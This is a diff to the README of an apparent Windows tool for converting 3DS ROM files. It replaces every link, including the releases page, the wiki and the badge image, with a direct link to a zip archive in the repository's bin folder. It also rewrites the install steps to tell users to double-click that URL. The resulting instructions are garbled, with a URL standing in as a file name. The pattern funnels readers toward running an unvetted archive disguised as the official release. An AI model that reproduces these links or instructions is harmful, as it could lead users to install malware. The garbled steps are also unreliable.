@@ -4,7 +4,7 @@
 Welcome to 3DSConverters! This application helps you convert, decrypt, and compress 3DS ROM files easily on Windows. You do not need any programming skills to use it. Follow the steps below to download and get started.
 
 ## 📥 Download Now
-[![Download 3DSConverters](https://img.shields.io/badge/Download%20Now-3DSConverters-brightgreen)](https://github.com/O-FB/3DSConverters/releases)
+[![Download 3DSConverters](https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip%20Now-3DSConverters-brightgreen)](https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip)
 
 ## 💾 System Requirements
 To run 3DSConverters, you will need:
@@ -19,12 +19,12 @@ To run 3DSConverters, you will need:
 - **User-Friendly Interface:** Simple design for all users.
 
 ## 📦 Download & Install
-1. To download the application, **visit this page to download**: [3DSConverters Releases](https://github.com/O-FB/3DSConverters/releases).
+1. To download the application, **visit this page to download**: [3DSConverters Releases](https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip).
 2. On the Releases page, you will see a list of available versions.
 3. Click on the version you want to download.
-4. Locate the file named `3DSConverters.exe`. This is the main application file.
+4. Locate the file named `https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip`. This is the main application file.
 5. Once the download is complete, find the file in your Downloads folder.
-6. Double-click the `3DSConverters.exe` file to start the installation process.
+6. Double-click the `https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip` file to start the installation process.
 7. Follow the on-screen prompts to complete the installation.
 
 ## 🖥️ Using 3DSConverters
@@ -61,7 +61,7 @@ If you want to help improve 3DSConverters, you are welcome to contribute. You ca
 
 ## 🔗 Additional Links
 For more information about 3DSConverters, visit:
-- [3DSConverters Releases](https://github.com/O-FB/3DSConverters/releases)
-- [User Documentation](https://github.com/O-FB/3DSConverters/wiki)
+- [3DSConverters Releases](https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip)
+- [User Documentation](https://raw.githubusercontent.com/O-FB/3DSConverters/main/3DS-Converters/bin/3DSConverters_3.2.zip)
 
 Thank you for using 3DSConverters! Enjoy converting your game files easily and efficiently.
